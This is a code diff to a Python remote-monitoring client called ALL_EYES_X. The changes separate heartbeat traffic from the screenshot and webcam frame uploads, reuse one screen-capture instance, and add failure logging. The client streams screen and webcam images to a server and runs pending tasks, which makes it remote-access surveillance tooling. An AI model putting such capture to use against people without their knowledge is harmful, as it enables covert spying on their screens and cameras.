@@ -36,6 +36,7 @@ import ssl
 import re
 import struct
 import io
+import contextlib
 from xmlrpc import server
 import zlib
 import datetime
@@ -1681,53 +1682,81 @@ def collect_security_telemetry():
 import http.client
 from urllib.parse import urlparse
 
-_http_conn = None
-_http_target = None
+# ---------------------------------------------------------------------------
+# TWO SEPARATE HTTP CHANNELS
+#
+# Heartbeats and video frames used to share ONE keep-alive socket. A frame is a
+# large POST; with a 10s timeout and one retry, a single stalled screenshot
+# upload could block that socket for ~20s. Two in a row put more than 30s
+# between heartbeats, the server's offline threshold, so a device on a slow or
+# congested link (Tailscale, Wi-Fi) would flap offline - it appeared in the
+# system and then disappeared.
+#
+# Splitting them means a frame upload can never delay a heartbeat:
+#   control - heartbeat / register / command results. Small, must get through,
+#             so it keeps the 10s timeout and one retry.
+#   bulk    - screenshot / webcam frames. Large and disposable, so it gets a
+#             short timeout and NO retry: dropping a frame is free, and the next
+#             one arrives 20ms later.
+# ---------------------------------------------------------------------------
+CHANNEL_TIMEOUTS = {'control': 10.0, 'bulk': 4.0}
+CHANNEL_RETRIES = {'control': 2, 'bulk': 1}
+
+_conns = {'control': None, 'bulk': None}
+_conn_targets = {'control': None, 'bulk': None}
 
 
-def _close_conn():
-    global _http_conn, _http_target
-    if _http_conn is not None:
+def _close_conn(channel='control'):
+    if _conns.get(channel) is not None:
         try:
-            _http_conn.close()
+            _conns[channel].close()
         except Exception:
             pass
-    _http_conn = None
-    _http_target = None
+    _conns[channel] = None
+    _conn_targets[channel] = None
 
 
-def _ensure_conn(parsed):
-    """Return a keep-alive connection bound to the current SERVER_URL.
+def _close_all_conns():
+    for channel in list(_conns):
+        _close_conn(channel)
+
+
+def _ensure_conn(parsed, channel='control'):
+    """Return the keep-alive connection for one channel, bound to SERVER_URL.
 
     SERVER_URL may be reassigned from argv/env after import, so the target is
     re-checked on every call instead of being cached once at import time.
     """
-    global _http_conn, _http_target
     target = (parsed.scheme, parsed.hostname or '127.0.0.1', parsed.port)
-    if _http_conn is not None and _http_target == target:
-        return _http_conn
-    _close_conn()
+    if _conns.get(channel) is not None and _conn_targets.get(channel) == target:
+        return _conns[channel]
+    _close_conn(channel)
     host = parsed.hostname or '127.0.0.1'
+    timeout = CHANNEL_TIMEOUTS.get(channel, 10.0)
     if parsed.scheme == 'https':
-        _http_conn = http.client.HTTPSConnection(
-            host, parsed.port or 443, timeout=10, context=create_ssl_context()
+        _conns[channel] = http.client.HTTPSConnection(
+            host, parsed.port or 443, timeout=timeout, context=create_ssl_context()
         )
     else:
-        _http_conn = http.client.HTTPConnection(host, parsed.port or 80, timeout=10)
-    _http_target = target
-    return _http_conn
+        _conns[channel] = http.client.HTTPConnection(
+            host, parsed.port or 80, timeout=timeout
+        )
+    _conn_targets[channel] = target
+    return _conns[channel]
 
 
-def _http_json(endpoint, data=None, method='POST'):
-    """Perform one JSON request over the persistent connection.
+def _http_json(endpoint, data=None, method='POST', channel='control'):
+    """Perform one JSON request over the given channel's persistent connection.
 
-    Retries once with a fresh socket if the pooled connection was dropped.
+    Retries with a fresh socket if the pooled connection was dropped. Control
+    traffic retries once; bulk frames do not, because a stale frame is worthless
+    by the time a retry would land.
     """
     parsed = urlparse(SERVER_URL)
     path = (parsed.path or '') + endpoint
     body = None
     headers = {
-        'User-Agent': 'ALL_EYES_X-Client/3.4',
+        'User-Agent': 'ALL_EYES_X-Client/3.5',
         'Connection': 'keep-alive',
     }
     if data is not None:
@@ -1735,8 +1764,8 @@ def _http_json(endpoint, data=None, method='POST'):
         headers['Content-Type'] = 'application/json'
 
     last_error = None
-    for _attempt in range(2):
-        conn = _ensure_conn(parsed)
+    for _attempt in range(CHANNEL_RETRIES.get(channel, 2)):
+        conn = _ensure_conn(parsed, channel)
         try:
             conn.request(method, path, body=body, headers=headers)
             resp = conn.getresponse()
@@ -1750,17 +1779,19 @@ def _http_json(endpoint, data=None, method='POST'):
                 return {'error': 'Invalid JSON response', 'status': status}
         except (http.client.HTTPException, ConnectionError, OSError, TimeoutError) as e:
             last_error = e
-            _close_conn()
+            _close_conn(channel)
             continue
     return {'error': f'Connection failed: {last_error}'}
 
 
 def api_request(endpoint, data=None, method='POST'):
-    return _http_json(endpoint, data=data, method=method)
+    """Control traffic: heartbeat, register, command results."""
+    return _http_json(endpoint, data=data, method=method, channel='control')
 
 
 def api_request_raw(endpoint, data, method='POST'):
-    result = _http_json(endpoint, data=data, method=method)
+    """Bulk traffic: screenshot and webcam frames. Never blocks the heartbeat."""
+    result = _http_json(endpoint, data=data, method=method, channel='bulk')
     if isinstance(result, dict) and 'Connection failed' in str(result.get('error', '')):
         return {'error': 'send_failed'}
     return result
@@ -1774,6 +1805,40 @@ _frame_width = 0
 _frame_height = 0
 _last_full_send = 0.0
 
+_mss_instance = None
+_screenshot_error_notice = 0.0
+
+
+def _get_mss():
+    """One reusable mss instance for the life of the process.
+
+    A fresh mss.mss() was being created on every capture - 50 times a second.
+    That opens and closes a display/GDI context each time, and on current mss it
+    also prints a DeprecationWarning per call, which buried every real line of
+    agent output (logs/client.err.log filled with nothing but that warning).
+    """
+    global _mss_instance
+    if _mss_instance is None:
+        import mss
+        factory = getattr(mss, 'MSS', None) or mss.mss
+        _mss_instance = factory()
+    return _mss_instance
+
+
+def _report_screenshot_error(stage, exc):
+    """Print capture failures at most once a minute.
+
+    Every failure path in capture used to be a bare `except: pass`, so a broken
+    capture stack produced a stream of nothing and no explanation at all.
+    """
+    global _screenshot_error_notice
+    now = time.time()
+    if now - _screenshot_error_notice < 60:
+        return
+    _screenshot_error_notice = now
+    print(f"[-] Screenshot capture failed at {stage}: {type(exc).__name__}: {exc}")
+
+
 def capture_screenshot():
     global _prev_frame_array, _frame_width, _frame_height, _last_full_send
     if not capability_profile().get('screenshot'):
@@ -1785,7 +1850,8 @@ def capture_screenshot():
         from PIL import Image
         import numpy as np
         
-        with mss.mss() as sct:
+        # nullcontext keeps the original block shape while reusing one instance.
+        with contextlib.nullcontext(_get_mss()) as sct:
             monitor = sct.monitors[1]
             sct_img = sct.grab(monitor)
             
@@ -1873,9 +1939,12 @@ def capture_screenshot():
                 'screen_width': current_w,
                 'screen_height': current_h,
             }
-    except:
-        pass
-    
+    except Exception as exc:
+        # numpy or mss unavailable/broken. Falls through to the ImageGrab
+        # fallback below, which sends whole frames - the stream survives but
+        # loses dirty-rect compression, so say so instead of staying silent.
+        _report_screenshot_error('mss/numpy path', exc)
+
     try:
         from PIL import ImageGrab
         img = ImageGrab.grab()
@@ -1890,8 +1959,8 @@ def capture_screenshot():
             'width': w, 'height': h,
             'screen_width': w, 'screen_height': h,
         }
-    except:
-        pass
+    except Exception as exc:
+        _report_screenshot_error('ImageGrab fallback', exc)
     
     if sys.platform == 'win32':
         return capture_subprocess_windows_full()
@@ -2447,7 +2516,22 @@ class ALLEYESXClient:
                 self.registered = False
                 print("[-] Server lost our identity. Re-registering...")
                 return
+            # A heartbeat failure used to be swallowed completely. The device
+            # then went offline on the server after 30s with nothing printed
+            # here, which is exactly the "appears then disappears" symptom with
+            # no way to tell why. Report the first failure, then every 12th
+            # (~1/minute) so a long outage is visible without flooding the log.
+            self._hb_failures = getattr(self, '_hb_failures', 0) + 1
+            if self._hb_failures == 1 or self._hb_failures % 12 == 0:
+                print(
+                    f"[-] Heartbeat failed ({self._hb_failures} in a row): {err}. "
+                    f"Server may mark this node offline after 30s of silence."
+                )
             return
+
+        if getattr(self, '_hb_failures', 0):
+            print(f"[+] Heartbeat recovered after {self._hb_failures} failure(s)")
+            self._hb_failures = 0
 
         pending_tasks = result.get('pending_tasks', [])
         if pending_tasks:
